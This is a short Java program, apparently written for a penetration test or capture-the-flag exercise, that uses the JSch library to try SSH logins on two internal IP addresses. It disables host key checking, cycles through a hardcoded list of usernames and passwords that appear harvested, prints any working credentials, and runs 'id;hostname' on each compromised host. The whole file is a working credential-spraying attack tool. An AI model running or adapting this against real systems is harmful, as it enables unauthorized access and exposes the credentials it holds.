import com.jcraft.jsch.*;
import java.io.*;
class SSH2 {
  static boolean trySSH(String host, String user, String pass) {
    try {
      JSch j = new JSch();
      Session s = j.getSession(user, host, 22);
      s.setPassword(pass);
      java.util.Properties p = new java.util.Properties();
      p.put("StrictHostKeyChecking", "no");
      s.setConfig(p);
      s.setTimeout(8000);
      s.connect();
      System.out.println("SUCCESS: " + user + "@" + host + " pass=" + pass);
      ChannelExec ch = (ChannelExec) s.openChannel("exec");
      ch.setCommand("id;hostname");
      ch.setInputStream(null);
      InputStream in = ch.getInputStream();
      ch.connect();
      byte[] buf = new byte[4096];
      int i;
      while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
      ch.disconnect();
      s.disconnect();
      return true;
    } catch (Exception e) {
      System.out.println("FAIL: " + user + "@" + host + " pass=" + pass + " err=" + e.getMessage());
      return false;
    }
  }
  public static void main(String[] a) throws Exception {
    String[] hosts = {"10.14.36.23", "10.14.36.40"};
    String[][] creds = {
      {"root", "kutul0nc4t"}, {"user", "kutul0nc4t"}, {"admin", "kutul0nc4t"},
      {"herman", "canigonow"}, {"atlassian", "atlassian"},
      {"root", "canigonow"}, {"root", "atlassian"},
      {"crowd", "vTZjuBMq"}, {"root", "bukanpassword"},
      {"seph", "kutul0nc4t"}, {"root", "hyperlink"}
    };
    for (String h : hosts) {
      System.out.println("=== Trying " + h + " ===");
      for (String[] c : creds) {
        if (trySSH(h, c[0], c[1])) break;
      }
    }
  }
}
